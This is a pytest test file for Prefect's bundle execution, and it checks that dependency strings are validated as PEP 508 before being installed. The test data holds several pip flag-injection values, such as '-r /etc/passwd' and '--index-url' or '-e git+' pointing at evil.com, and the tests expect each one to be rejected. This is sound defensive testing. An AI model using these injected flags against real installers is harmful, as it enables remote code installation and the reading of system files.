"""Tests for PEP 508 dependency validation in execute_bundle_in_subprocess."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from prefect.bundles import SerializedBundle, execute_bundle_in_subprocess


def _make_bundle(dependencies: str) -> SerializedBundle:
    """Create a minimal bundle with the given dependencies string."""
    return {
        "function": "dW51c2Vk",  # dummy base64
        "context": "dW51c2Vk",
        "flow_run": {"id": "test-run"},
        "dependencies": dependencies,
    }


class TestDependencyValidation:
    """Tests for PEP 508 dependency validation in execute_bundle_in_subprocess."""

    def test_rejects_flag_injection_dash_r(self):
        """Flag injection via -r should be rejected."""
        bundle = _make_bundle("-r /etc/passwd")
        with pytest.raises(ValueError, match="command-line flags are not allowed"):
            execute_bundle_in_subprocess(bundle)

    def test_rejects_flag_injection_double_dash(self):
        """Flag injection via -- flags should be rejected."""
        bundle = _make_bundle("--index-url http://evil.com/simple")
        with pytest.raises(ValueError, match="command-line flags are not allowed"):
            execute_bundle_in_subprocess(bundle)

    def test_rejects_invalid_pep508_specifier(self):
        """Non-PEP-508 strings should be rejected."""
        bundle = _make_bundle("not a valid requirement!!!")
        with pytest.raises(ValueError, match="Invalid PEP 508 dependency specifier"):
            execute_bundle_in_subprocess(bundle)

    def test_accepts_valid_pep508_dependencies(self):
        """Valid PEP 508 specifiers should pass validation and call subprocess."""
        bundle = _make_bundle("requests>=2.28.0\nflask==3.0.0")

        with patch("prefect.bundles.subprocess") as mock_subprocess:
            mock_subprocess.check_call = MagicMock()
            # Mock the spawn context to avoid actually starting a process
            with patch("prefect.bundles.multiprocessing") as mock_mp:
                mock_ctx = MagicMock()
                mock_mp.get_context.return_value = mock_ctx
                mock_process = MagicMock()
                mock_ctx.Process.return_value = mock_process

                execute_bundle_in_subprocess(bundle)

                # Verify subprocess.check_call was called with validated deps
                mock_subprocess.check_call.assert_called_once()
                call_args = mock_subprocess.check_call.call_args[0][0]
                assert "requests>=2.28.0" in call_args
                assert "flask==3.0.0" in call_args

    def test_filters_empty_and_whitespace_lines(self):
        """Empty lines and whitespace-only lines should be filtered out."""
        bundle = _make_bundle("requests>=2.28.0\n\n  \nflask==3.0.0\n")

        with patch("prefect.bundles.subprocess") as mock_subprocess:
            mock_subprocess.check_call = MagicMock()
            with patch("prefect.bundles.multiprocessing") as mock_mp:
                mock_ctx = MagicMock()
                mock_mp.get_context.return_value = mock_ctx
                mock_process = MagicMock()
                mock_ctx.Process.return_value = mock_process

                execute_bundle_in_subprocess(bundle)

                call_args = mock_subprocess.check_call.call_args[0][0]
                # Should only have the two valid deps, not empty strings
                dep_args = call_args[3:]  # Skip uv, pip, install
                assert dep_args == ["requests>=2.28.0", "flask==3.0.0"]

    def test_skips_validation_when_no_dependencies(self):
        """When dependencies is empty, no validation or install should happen."""
        bundle = _make_bundle("")

        with patch("prefect.bundles.subprocess") as mock_subprocess:
            mock_subprocess.check_call = MagicMock()
            with patch("prefect.bundles.multiprocessing") as mock_mp:
                mock_ctx = MagicMock()
                mock_mp.get_context.return_value = mock_ctx
                mock_process = MagicMock()
                mock_ctx.Process.return_value = mock_process

                execute_bundle_in_subprocess(bundle)

                # check_call should not be called since deps are empty
                mock_subprocess.check_call.assert_not_called()

    def test_rejects_flag_injection_with_valid_prefix(self):
        """A line that starts with a dash even after valid deps should be rejected."""
        bundle = _make_bundle("requests>=2.0\n-e git+https://evil.com/repo.git")
        with pytest.raises(ValueError, match="command-line flags are not allowed"):
            execute_bundle_in_subprocess(bundle)

    def test_accepts_extras_and_markers(self):
        """PEP 508 with extras and environment markers should pass."""
        bundle = _make_bundle('requests[security]>=2.28.0; python_version>="3.8"')

        with patch("prefect.bundles.subprocess") as mock_subprocess:
            mock_subprocess.check_call = MagicMock()
            with patch("prefect.bundles.multiprocessing") as mock_mp:
                mock_ctx = MagicMock()
                mock_mp.get_context.return_value = mock_ctx
                mock_process = MagicMock()
                mock_ctx.Process.return_value = mock_process

                execute_bundle_in_subprocess(bundle)
                mock_subprocess.check_call.assert_called_once()
